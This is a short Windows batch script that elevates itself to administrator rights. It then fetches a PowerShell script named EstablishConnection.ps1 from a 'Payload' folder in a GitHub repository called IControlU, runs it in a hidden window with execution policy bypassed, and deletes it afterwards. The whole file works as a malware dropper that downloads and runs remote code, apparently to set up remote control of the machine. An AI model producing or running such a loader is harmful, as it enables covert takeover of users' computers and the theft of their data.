@echo off

:: Check for admin privileges using PowerShell
powershell -Command "([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)" >nul 2>&1
if %ERRORLEVEL% neq 0 (
    echo You need administrative privileges to run this script.
    echo Restarting script with admin rights...
    powershell -Command "Start-Process -FilePath '%0' -ArgumentList 'RunAs_Admin' -Verb RunAs"
    exit /b
)

:: If script is running with admin rights, continue with execution
if "%1"=="RunAs_Admin" (
    :: Download and execute PowerShell script with admin rights
    powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ReylanTeo/IControlU/main/Payload/EstablishConnection.ps1' -OutFile 'EstablishConnection.ps1'; .\EstablishConnection.ps1"
    :: Clean up: remove downloaded script if needed
    del EstablishConnection.ps1
    exit /b
)

:: If not running with admin rights, restart script with admin rights
powershell -Command "Start-Process -FilePath '%0' -ArgumentList 'RunAs_Admin' -Verb RunAs"

:: End of script
exit /b
